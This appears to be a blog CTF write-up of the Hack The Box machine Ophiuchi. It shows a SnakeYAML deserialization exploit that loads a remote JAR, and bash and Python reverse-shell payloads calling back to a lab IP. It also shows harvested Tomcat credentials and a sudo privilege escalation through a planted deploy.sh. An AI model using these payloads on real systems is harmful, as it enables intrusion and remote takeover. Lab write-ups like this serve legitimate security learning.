<!DOCTYPE html>
<html lang="en-us">

  <head>
  <link href="http://gmpg.org/xfn/11" rel="profile" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta http-equiv="content-type" content="text/html; charset=utf-8" />

  <!-- Enable responsiveness on mobile devices-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />

  <title>
    
      Hack The Box - Ophiuchi &middot; Ryan Kozak
    
  </title>

  


  <!-- CSS -->
  <link rel="stylesheet" href="/assets/css/main.css" />
  

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Abril+Fatface" />

  <!-- Icons -->
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/favicon.png" />
<link rel="shortcut icon" href="/favicon.ico" />

  <!-- RSS -->
  <link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml" />

  <!-- Additional head bits without overriding original head -->

  <!-- Begin Jekyll SEO tag v2.7.1 -->
<title>Hack The Box - Ophiuchi | Ryan Kozak</title>
<meta name="generator" content="Jekyll v3.8.7" />
<meta property="og:title" content="Hack The Box - Ophiuchi" />
<meta name="author" content="Ryan Kozak" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="hacking, web development, $other" />
<meta property="og:description" content="hacking, web development, $other" />
<link rel="canonical" href="http://0.0.0.0:4000/hack-the-box-craft-ophiuchi/" />
<meta property="og:url" content="http://0.0.0.0:4000/hack-the-box-craft-ophiuchi/" />
<meta property="og:site_name" content="Ryan Kozak" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-07-16T00:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Hack The Box - Ophiuchi" />
<script type="application/ld+json">
{"@type":"BlogPosting","headline":"Hack The Box - Ophiuchi","dateModified":"2021-07-16T21:39:29+00:00","datePublished":"2021-07-16T00:00:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/hack-the-box-craft-ophiuchi/"},"url":"http://0.0.0.0:4000/hack-the-box-craft-ophiuchi/","author":{"@type":"Person","name":"Ryan Kozak"},"description":"hacking, web development, $other","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


</head>


  <body class="post">

    <div id="sidebar">
  <header>
    <div class="site-title">
      <a href="/">
        
          <span class="back-arrow icon"><svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
  <path d="M0 0h24v24H0z" fill="none"/>
  <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
</svg></span>
        
        Ryan Kozak
      </a>
    </div>
    <p class="lead">hacking, web development, $other</p>
  </header>
  <nav id="sidebar-nav-links">

  
    <a class="home-link "
        href="/">Home</a>
  

  

  

  


  
    
  

  
    
    	
      		<a class="page-link " href="/about/">About</a>
    	
    
  

  
    
    	
      		<a class="page-link " href="/contact/">Contact</a>
    	
    
  

  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  

  
    
    	
      		<a class="page-link " href="/books/index.html">Book List</a>
    	
    
  

  
    
    	
    	<!-- TingTingPowPow -->
    	
    
  

  
    
    	
    	<!-- TingTingPowPow -->
    	
    
  

  
    
    	
    	<!-- TingTingPowPow -->
    	
    
  

  
    
    	
    	<!-- TingTingPowPow -->
    	
    
  

  
    
    	
    	<!-- TingTingPowPow -->
    	
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  

  



  


  
    
  

  
    
  

  
    
  

  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  

  

  
  <!-- Optional additional links to insert in sidebar nav -->


</nav>


  <nav id="sidebar-icon-links">
  
    <a id="github-link"
       class="icon" title="Github Profile" aria-label="Github Profile"
       href="https://github.com/d0n601">
      <svg version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 28"><path d="M12 2c6.625 0 12 5.375 12 12 0 5.297-3.437 9.797-8.203 11.391-0.609 0.109-0.828-0.266-0.828-0.578 0-0.391 0.016-1.687 0.016-3.297 0-1.125-0.375-1.844-0.812-2.219 2.672-0.297 5.484-1.313 5.484-5.922 0-1.313-0.469-2.375-1.234-3.219 0.125-0.313 0.531-1.531-0.125-3.187-1-0.313-3.297 1.234-3.297 1.234-0.953-0.266-1.984-0.406-3-0.406s-2.047 0.141-3 0.406c0 0-2.297-1.547-3.297-1.234-0.656 1.656-0.25 2.875-0.125 3.187-0.766 0.844-1.234 1.906-1.234 3.219 0 4.594 2.797 5.625 5.469 5.922-0.344 0.313-0.656 0.844-0.766 1.609-0.688 0.313-2.438 0.844-3.484-1-0.656-1.141-1.844-1.234-1.844-1.234-1.172-0.016-0.078 0.734-0.078 0.734 0.781 0.359 1.328 1.75 1.328 1.75 0.703 2.141 4.047 1.422 4.047 1.422 0 1 0.016 1.937 0.016 2.234 0 0.313-0.219 0.688-0.828 0.578-4.766-1.594-8.203-6.094-8.203-11.391 0-6.625 5.375-12 12-12zM4.547 19.234c0.031-0.063-0.016-0.141-0.109-0.187-0.094-0.031-0.172-0.016-0.203 0.031-0.031 0.063 0.016 0.141 0.109 0.187 0.078 0.047 0.172 0.031 0.203-0.031zM5.031 19.766c0.063-0.047 0.047-0.156-0.031-0.25-0.078-0.078-0.187-0.109-0.25-0.047-0.063 0.047-0.047 0.156 0.031 0.25 0.078 0.078 0.187 0.109 0.25 0.047zM5.5 20.469c0.078-0.063 0.078-0.187 0-0.297-0.063-0.109-0.187-0.156-0.266-0.094-0.078 0.047-0.078 0.172 0 0.281s0.203 0.156 0.266 0.109zM6.156 21.125c0.063-0.063 0.031-0.203-0.063-0.297-0.109-0.109-0.25-0.125-0.313-0.047-0.078 0.063-0.047 0.203 0.063 0.297 0.109 0.109 0.25 0.125 0.313 0.047zM7.047 21.516c0.031-0.094-0.063-0.203-0.203-0.25-0.125-0.031-0.266 0.016-0.297 0.109s0.063 0.203 0.203 0.234c0.125 0.047 0.266 0 0.297-0.094zM8.031 21.594c0-0.109-0.125-0.187-0.266-0.172-0.141 0-0.25 0.078-0.25 0.172 0 0.109 0.109 0.187 0.266 0.172 0.141 0 0.25-0.078 0.25-0.172zM8.937 21.438c-0.016-0.094-0.141-0.156-0.281-0.141-0.141 0.031-0.234 0.125-0.219 0.234 0.016 0.094 0.141 0.156 0.281 0.125s0.234-0.125 0.219-0.219z"></path>
</svg>

    </a>
  

  
  <a id="stackoverflow-link"
     class="icon" title="Stack Overflow Profile" aria-label="Stack Overflow Profile"
     href="https://stackoverflow.com/users/4681506/ryan-kozak">
    <?xml version="1.0" encoding="utf-8"?>
<svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
	 viewBox="0 0 120 120" style="enable-background:new 0 0 120 120;" xml:space="preserve">
<style type="text/css">
	.st0{fill:#BCBBBB;}
	.st1{fill:#F48023;}
</style>
<polygon class="st0" points="84.4,93.8 84.4,70.6 92.1,70.6 92.1,101.5 22.6,101.5 22.6,70.6 30.3,70.6 30.3,93.8 "/>
<path class="st1" d="M38.8,68.4l37.8,7.9l1.6-7.6l-37.8-7.9L38.8,68.4z M43.8,50.4l35,16.3l3.2-7l-35-16.4L43.8,50.4z M53.5,33.2
	l29.7,24.7l4.9-5.9L58.4,27.3L53.5,33.2z M72.7,14.9l-6.2,4.6l23,31l6.2-4.6L72.7,14.9z M38,86h38.6v-7.7H38V86z"/>
</svg>

  </a>
  

  
  
  
  

  
    <a id="tags-link"
       class="icon"
       title="Tags" aria-label="Tags"
       href="/tags/">
      <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
    </a>
  

  
    <a id="search-link"
       class="icon"
       title="Search" aria-label="Search"
       href="/search/">
      <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/>
    <path d="M0 0h24v24H0z" fill="none"/>
</svg>
    </a>
  

  <!-- Optional additional links to insert for icons links -->
</nav>
 
  <p class="copyright">
  &copy; 2021 Ryan Kozak.
</p>

</div>

    <main class="container">
      <header>
  <h1 class="post-title">Hack The Box - Ophiuchi</h1>
</header>
<div class="content">
  <div class="post-meta">
  <span class="post-date">16 Jul 2021</span>
  <span class="post-categories">
    
      &bull;

      
      
      

      
        CTF Writeup
      
    
      &bull;

      
      
      

      
        Security
      
    
  </span>
</div>

  <div class="post-body">
    <p><img src="/wp-content/uploads/2021/07/ophiuchi/badge.png" alt="badge" /></p>

<h1 id="introduction">Introduction</h1>
<p>Ophiuchi is a Medium box with a weird name to pronounce. The initial foothold was straight forward but fun, the user flag reminds us to go back to the basics, and the root flag is a difficult mind game for those of us that haven’t even been exposed to the technology.</p>

<h1 id="information-gathering">Information Gathering</h1>
<h2 id="port-scan-nmapautomator">Port Scan: nmapAutomator</h2>
<p>We begin our reconnaissance by running <em><a href="https://github.com/21y4d/nmapAutomator">nmapAutomator</a></em> via <code class="highlighter-rouge">sudo ./nmapAutomator.sh 10.10.10.227 All</code>. Among many other things, this runs our port scans with increasing comprehensiveness.</p>

<p>Output of Basic nmap scan below.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/Tools/nmapAutomator/10.10.10.227/nmap]
└─$ cat Basic_10.10.10.227.nmap
# Nmap 7.91 scan initiated Fri Jun 11 19:18:21 2021 as: nmap -Pn -sCV -p22,8080 -oN nmap/Basic_10.10.10.227.nmap --dns-server=1.1.1.1 10.10.10.227
Nmap scan report for 10.10.10.227
Host is up (0.34s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA)
|   256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA)
|_  256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519)
8080/tcp open  http    Apache Tomcat 9.0.38
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Parse YAML
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun 11 19:18:49 2021 -- 1 IP address (1 host up) scanned in 27.15 seconds
</code></pre></div></div>

<p>The open ports on the machine are <strong>22</strong> and <strong>8080</strong>. These are all we’ll need to proceed through the rest of the box. Let’s take a look at what’s on the web port.</p>

<h3 id="port-8080">Port 8080</h3>
<p>Browsing to the website we can see that it’s a web application for parsing YAML.<br />
<img src="/wp-content/uploads/2021/07/ophiuchi/parser.png" alt="yaml_webapp" /><br />
<strong>Figure 1:</strong> Online YAML parser</p>

<p>A quick search for “YAML parser vulnerability” leads us to “Snake YAML Deserilization” <em><a href="https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858">1</a></em>.</p>

<p><img src="/wp-content/uploads/2021/07/ophiuchi/yaml_google.png" alt="yaml_google" /><br />
<strong>Figure 2:</strong> Snake YAML Deserilization Exploit.</p>

<h1 id="exploitation">Exploitation</h1>
<h2 id="initial-foothold">Initial foothold</h2>
<p>The SnakeYAML deserilization attack is made easier with artsploit’s <em><a href="https://github.com/artsploit/yaml-payload">yaml-payload Github repository</a></em> and an additional payload for a reverse shell can be found in <em><a href="https://github.com/artsploit/yaml-payload/issues/3">issue 3</a></em>.</p>

<p>First, we’ll clone the repository <code class="highlighter-rouge">git clone https://github.com/artsploit/yaml-payload.git</code>.<br />
<img src="/wp-content/uploads/2021/07/ophiuchi/clone.png" alt="clone_repo" />
<strong>Figure 3:</strong> Clone yaml-payload repo.</p>

<p>We then navigate to <code class="highlighter-rouge">yaml-payload/src/artsploit</code> and modify the <code class="highlighter-rouge">AwesomeScriptEngineFactory()</code> method within <code class="highlighter-rouge">AwesomeScriptEngineFactory.java</code>. The default payload pops open the calculator application on MacOS. The payloads that are posted in <em><a href="https://github.com/artsploit/yaml-payload/issues/3">issue 3</a></em> of this repo will call a reverse shell, so rather than recreating them, we’ll drop the first payload into <code class="highlighter-rouge">AwesomeScriptEngineFactory.java</code> with our IP address as the callback.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="nf">AwesomeScriptEngineFactory</span><span class="o">()</span> <span class="o">{</span>
    <span class="nc">String</span> <span class="o">[]</span> <span class="n">cmd</span><span class="o">={</span><span class="s">"bash"</span><span class="o">,</span><span class="s">"-c"</span><span class="o">,</span><span class="s">"bash -i &gt;&amp; /dev/tcp/10.10.14.3/8081 0&gt;&amp;1"</span><span class="o">};</span>
    <span class="nc">String</span> <span class="o">[]</span> <span class="n">jex</span><span class="o">={</span><span class="s">"bash"</span><span class="o">,</span><span class="s">"-c"</span><span class="o">,</span><span class="s">"{echo,$(echo -n $cmd | base64)}|{base64,-d}|{bash,-i}"</span><span class="o">};</span>
    <span class="k">try</span> <span class="o">{</span>
        <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmd</span><span class="o">);</span>
        <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">jex</span><span class="o">);</span>
        <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"echo $jex"</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p><img src="/wp-content/uploads/2021/07/ophiuchi/awesome_jar.png" alt="awesome_jar" />
<strong>Figure 4:</strong> Placing reverse shell payload into <code class="highlighter-rouge">AwesomeScriptEngineFactory.java</code>’s <code class="highlighter-rouge">AwesomeScriptEngineFactory()</code> method.</p>

<p>Now, as instructed by the repository, we’ll compile the <code class="highlighter-rouge">AwesomeScriptEngineFactory.java</code> file and build our <code class="highlighter-rouge">yaml-payload.jar</code> file.</p>

<p><img src="/wp-content/uploads/2021/07/ophiuchi/build.png" alt="build" /><br />
<strong>Figure 5:</strong> Compiling Java exploit and building <code class="highlighter-rouge">yaml-payload.jar</code>.</p>

<p>Since the snippet we’ll be placing into the web application will pull <code class="highlighter-rouge">yaml-payload.jar</code> from a remote url, we’ll copy the payload to our apache directory and make sure the server is running.</p>

<p><img src="/wp-content/uploads/2021/07/ophiuchi/copy_server.png" alt="copy_server" /><br />
<strong>Figure 6:</strong> Copy <code class="highlighter-rouge">yaml-payload.jar</code> to Apache’s directory and start the server.</p>

<p>By placing the snippet below into the YAML parser, we’ll download the payload we’ve just created and hosted, and execute it  on the victim machine (we must first not forget to start our netcat listener on port 8081)</p>
<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">!!</span><span class="n">javax</span><span class="o">.</span><span class="na">script</span><span class="o">.</span><span class="na">ScriptEngineManager</span> <span class="o">[</span>
  <span class="o">!!</span><span class="n">java</span><span class="o">.</span><span class="na">net</span><span class="o">.</span><span class="na">URLClassLoader</span> <span class="o">[[</span>
    <span class="o">!!</span><span class="n">java</span><span class="o">.</span><span class="na">net</span><span class="o">.</span><span class="na">URL</span> <span class="o">[</span><span class="s">"http://10.10.14.3/yaml-payload.jar"</span><span class="o">]</span>
  <span class="o">]]</span>
<span class="o">]</span>
</code></pre></div></div>

<p><img src="/wp-content/uploads/2021/07/ophiuchi/execute_foothold.png" alt="execute_foothold" /><br />
<strong>Figure 7:</strong> Snippet placed in web application.</p>

<p>Once we click “parse” the payload is executed and our shell is obtained.</p>

<p><img src="/wp-content/uploads/2021/07/ophiuchi/foothold.png" alt="foothold" /><br />
<strong>Figure 8:</strong> Reverse shell as tomcat user.</p>

<h2 id="user-flag">User Flag</h2>
<p>Moving from the initial foothold to the user flag on this machine is fairly simple. After some manual enumeration we’ll find that <code class="highlighter-rouge">/opt/tomcat/conf/tomcat-users.xml</code> contains a password <code class="highlighter-rouge">whereisalimit</code> for the <code class="highlighter-rouge">admin</code> user.</p>

<p><img src="/wp-content/uploads/2021/07/ophiuchi/users_xml.png" alt="users_xml" /><br />
<strong>Figure 9:</strong> The <code class="highlighter-rouge">tomcat-users.xml</code> file containing credentials for <code class="highlighter-rouge">admin</code> user.</p>

<p>To login as the <code class="highlighter-rouge">admin</code> user, we’ll first use the old <code class="highlighter-rouge">python3 -c 'import pty; pty.spawn("/bin/bash")'</code> trick to get an interactive shell, and then simply <code class="highlighter-rouge">su</code> with the credentials we’ve found.<br />
<img src="/wp-content/uploads/2021/07/ophiuchi/user.png" alt="users" /><br />
<strong>Figure 10:</strong> The flag for the <code class="highlighter-rouge">admin</code> user.</p>

<h2 id="root-flag">Root Flag</h2>
<p>Running <em><a href="https://github.com/diego-treitos/linux-smart-enumeration">lse.sh</a></em> reveals that we’re able to execute <code class="highlighter-rouge">/opt/wasm-functions/index.go</code> via sudo without a password.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[!] sud010 Can we list sudo commands without a password?................... yes!
---
Matching Defaults entries for admin on ophiuchi:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on ophiuchi:
    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
---
</code></pre></div></div>

<p>When we examine the <code class="highlighter-rouge">/opt/wasm-functions/index.go</code> file, we can see that it reads <code class="highlighter-rouge">main.wasm</code> without a path, and calls <code class="highlighter-rouge">deploy.sh</code> without a path. If a variable <code class="highlighter-rouge">f</code> is set equal to <code class="highlighter-rouge">1</code>.</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">main</span>

<span class="k">import</span> <span class="p">(</span>
        <span class="s">"fmt"</span>
        <span class="n">wasm</span> <span class="s">"github.com/wasmerio/wasmer-go/wasmer"</span>
        <span class="s">"os/exec"</span>
        <span class="s">"log"</span>
<span class="p">)</span>


<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">bytes</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">wasm</span><span class="o">.</span><span class="n">ReadBytes</span><span class="p">(</span><span class="s">"main.wasm"</span><span class="p">)</span>

        <span class="n">instance</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">wasm</span><span class="o">.</span><span class="n">NewInstance</span><span class="p">(</span><span class="n">bytes</span><span class="p">)</span>
        <span class="k">defer</span> <span class="n">instance</span><span class="o">.</span><span class="n">Close</span><span class="p">()</span>
        <span class="n">init</span> <span class="o">:=</span> <span class="n">instance</span><span class="o">.</span><span class="n">Exports</span><span class="p">[</span><span class="s">"info"</span><span class="p">]</span>
        <span class="n">result</span><span class="p">,</span><span class="n">_</span> <span class="o">:=</span> <span class="n">init</span><span class="p">()</span>
        <span class="n">f</span> <span class="o">:=</span> <span class="n">result</span><span class="o">.</span><span class="n">String</span><span class="p">()</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">f</span> <span class="o">!=</span> <span class="s">"1"</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"Not ready to deploy"</span><span class="p">)</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"Ready to deploy"</span><span class="p">)</span>
                <span class="n">out</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">exec</span><span class="o">.</span><span class="n">Command</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="s">"deploy.sh"</span><span class="p">)</span><span class="o">.</span><span class="n">Output</span><span class="p">()</span>
                <span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
                        <span class="n">log</span><span class="o">.</span><span class="n">Fatal</span><span class="p">(</span><span class="n">err</span><span class="p">)</span>
                <span class="p">}</span>
                <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="kt">string</span><span class="p">(</span><span class="n">out</span><span class="p">))</span>
        <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>If we’re able to control this <code class="highlighter-rouge">f</code> variable, then we can create our own <code class="highlighter-rouge">deploy.sh</code> script to be executed in another directory (presumable to gain us a reverse shell as root).</p>

<p>To decompile <code class="highlighter-rouge">main.wasm</code> into a human readable <code class="highlighter-rouge">.wat</code> file, we can use the following <em><a href="https://github.com/WebAssembly/wabt.git">https://github.com/WebAssembly/wabt.git</a></em>.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/Tools]
└─$ git clone https://github.com/WebAssembly/wabt.git            
Cloning into 'wabt'...
remote: Enumerating objects: 29666, done.
remote: Counting objects: 100% (93/93), done.
remote: Compressing objects: 100% (72/72), done.
remote: Total 29666 (delta 37), reused 35 (delta 21), pack-reused 29573
Receiving objects: 100% (29666/29666), 20.83 MiB | 269.00 KiB/s, done.
Resolving deltas: 100% (23736/23736), done.
</code></pre></div></div>

<p>Since we’ve got the credentials to the <code class="highlighter-rouge">admin</code> user, it’s convenient enough to just <code class="highlighter-rouge">scp</code>  <code class="highlighter-rouge">main.wasm</code> to our local machine to decompile. Once we’ve done so <code class="highlighter-rouge">~/Tools/wabt/bin/wasm2wat ~/main.wasm &gt; ~/main.wat</code> yeilds the following web assembly code.</p>

<pre><code class="language-WebAssembly">(module
  (type (;0;) (func (result i32)))
  (func $info (type 0) (result i32)
    i32.const 0)
  (table (;0;) 1 1 funcref)
  (memory (;0;) 16)
  (global (;0;) (mut i32) (i32.const 1048576))
  (global (;1;) i32 (i32.const 1048576))
  (global (;2;) i32 (i32.const 1048576))
  (export "memory" (memory 0))
  (export "info" (func $info))
  (export "__data_end" (global 1))
  (export "__heap_base" (global 2)))
</code></pre>

<p>After more trial and error than I’d care to admit, it is determined that all we’ve got to do is change <code class="highlighter-rouge">i32.const</code> to be <code class="highlighter-rouge">1</code>, and the file becomes.</p>

<pre><code class="language-WebAssembly">(module
  (type (;0;) (func (result i32)))
  (func $info (type 0) (result i32)
    i32.const 1)
  (table (;0;) 1 1 funcref)
  (memory (;0;) 16)
  (global (;0;) (mut i32) (i32.const 1048576))
  (global (;1;) i32 (i32.const 1048576))
  (global (;2;) i32 (i32.const 1048576))
  (export "memory" (memory 0))
  (export "info" (func $info))
  (export "__data_end" (global 1))
  (export "__heap_base" (global 2)))
</code></pre>

<p>We finish up by rebuilding <code class="highlighter-rouge">main.wasm</code> via <code class="highlighter-rouge">~/Tools/wabt/bin/wat2wasm ~/main.wat &gt; ~/main.wasm</code>, and use <code class="highlighter-rouge">scp</code> once more to get it back on the machine.<br />
<img src="/wp-content/uploads/2021/07/ophiuchi/recompile.png" alt="recompile" /><br />
<strong>Figure 11:</strong> After modifying <code class="highlighter-rouge">i32.const</code> to be equal <code class="highlighter-rouge">1</code>, we place <code class="highlighter-rouge">main.wasm</code> back onto the victim machine.</p>

<p>Next, we ssh back into the box as <code class="highlighter-rouge">admin</code>. We’ll navigate to the <code class="highlighter-rouge">/tmp</code> directory and create our own <code class="highlighter-rouge">deploy.sh</code> to call our reverse shell. Since we know port <code class="highlighter-rouge">8081</code> worked last time, we’ll use that again (make sure the old listener used to catch the foothold is reset). The reverse shell payload will be the following python payload.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.3",8081));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
</span></code></pre></div></div>

<p><img src="/wp-content/uploads/2021/07/ophiuchi/deploy_sh.png" alt="deploy_sh" /><br />
<strong>Figure 12:</strong> SSH back in and create a malicious <code class="highlighter-rouge">deploy.sh</code> to call a reverse shell.</p>

<p>To gain root privileges we’ll do what we know we’re allowed to do which is <code class="highlighter-rouge">sudo /usr/bin/go run /opt/wasm-functions/index.go</code>, and as you can see below netcat has caught the root reverse shell.<br />
<img src="/wp-content/uploads/2021/07/ophiuchi/rooted.png" alt="rooted" /><br />
<strong>Figure 13:</strong> Root achieved via <code class="highlighter-rouge">/tmp</code> directory containing our own <code class="highlighter-rouge">deploy.sh</code> and <code class="highlighter-rouge">main.wasm</code> files.</p>

<h1 id="conclusion">Conclusion</h1>
<p>Knowing very little about Golang, and even less about WebAssembly, made the privilege escalation to root a real bastard for me. It was a great learning experience to decompile and recompile WebAssembly code. The box overall was extremely enjoyable (but I still am not sure how to pronounce the name).</p>

<h1 id="references">References</h1>
<ol>
  <li><a href="https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858">https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858</a></li>
  <li><a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></li>
  <li><a href="https://github.com/artsploit/yaml-payload/issues/3">https://github.com/artsploit/yaml-payload/issues/3</a></li>
  <li><a href="https://github.com/WebAssembly/wabt">https://github.com/WebAssembly/wabt</a></li>
</ol>

    



<div class="post-tags">
  
    
    <a href="/tags/#ctf">
    
      <span class="icon">
        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
      </span>&nbsp;<span class="tag-name">CTF</span>
    </a>
  
    
    <a href="/tags/#hack-the-box">
    
      <span class="icon">
        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
